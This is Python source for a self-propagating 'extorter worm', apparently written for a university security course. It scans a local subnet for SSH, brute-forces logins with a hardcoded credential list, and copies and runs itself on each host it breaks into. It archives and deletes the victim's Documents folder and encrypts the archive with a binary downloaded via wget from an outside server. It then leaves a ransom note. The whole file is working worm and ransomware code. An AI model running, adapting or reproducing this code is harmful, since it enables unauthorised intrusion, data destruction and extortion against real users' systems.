import paramiko
import sys
import socket
import netifaces
import nmap
import netinfo
import os
import sys
from subprocess import call
import tarfile
import shutil

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	return os.path.isfile("/tmp/infected.txt")

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	fp = open(INFECTED_MARKER_FILE, "w");
	fp.write("Hello!")
	fp.close()


def tar():
	tar = tarfile.open("Documents.tar","w:gz")
	tar.add("Documents", arcname=os.path.basename('/home/cpsc/'))
	tar.close()

	fp = open("/home/cpsc/note.txt","w")
	fp.write("Your files have been encrypted, if you want them back contact worm@replicate.com.")
	fp.close()

	shutil.rmtree('Documents/')

	call(["wget","http://ecs.fullerton.edu/~mgofman/openssl"])
	call(["chmod", "a+x","./openssl"])
	call(["./openssl", "aes-256-cbc","-a","-salt","-in","Documents.tar","-out","Documents.tar", "-k","cs456worm"])

#################s##############################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):

	sftpClient = sshClient.open_sftp()
	sftpClient.put("/tmp/extorter_worm.py","/tmp/extorter_worm.py")
	stdin,stdout, stderr = sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")
	stdin,stdout,stderr = sshClient.exec_command("python /tmp/extorter_worm.py 2> log.txt")
	

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - tihe host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	try:
		sshClient.connect(host, username = userName, password = password)
		return 0
	except paramiko.SSHException:
		return 1
	except (socket.error, socket.gaierror) as e:
		return 3

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
	
	# Go through the credentials
	for (username, password) in credList:
		
		result = tryCredentials(host, username, password, ssh)
		
		if not result == 1:
			attemptResults = (ssh, username, password, host)
			break
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		#pass	
			
	# Could not find working credentials
	return attemptResults 

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
	ipAddr = None

	for netFaces in interface:
		addr = netifaces.ifaddresses(netFaces)[2][0]['addr']

		if not addr == "127.0.0.1":
			ipAddr = addr
			break

	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.
	portScanner = nmap.PortScanner()

	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

	hostInfo = portScanner.all_hosts()

	liveHosts = []

	for host in hostInfo:
		if portScanner[host].state() == "up":
			liveHosts.append(host)	
	return liveHosts

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. T
if len(sys.argv) < 2:	
	if isInfectedSystem == "True":
		exit(0)
	else:
		tar()
		call(['cd', '/'], shell=True)
		markInfected()
	
# Get the IP of the current system
networkInterfaces = netifaces.interfaces()

myIP = getMyIP(networkInterfaces)

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# Remove the IP of the current system
networkHosts.remove(myIP)

print "Found hosts: ", networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	print "ssh info"
	print sshInfo
	

	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
		
		try:
			remotepath = '/tmp/infected.txt'
			localpath = '/home/cpsc/infected.txt'
			sftpClient = sshInfo[0].open_sftp()
			sftpClient.get(remotepath, localpath)		
		except IOError:
			print "This system should be infected"

			# Infect that system
			spreadAndExecute(sshInfo[0])
			exit(0)
		print "Spreading complete"
	

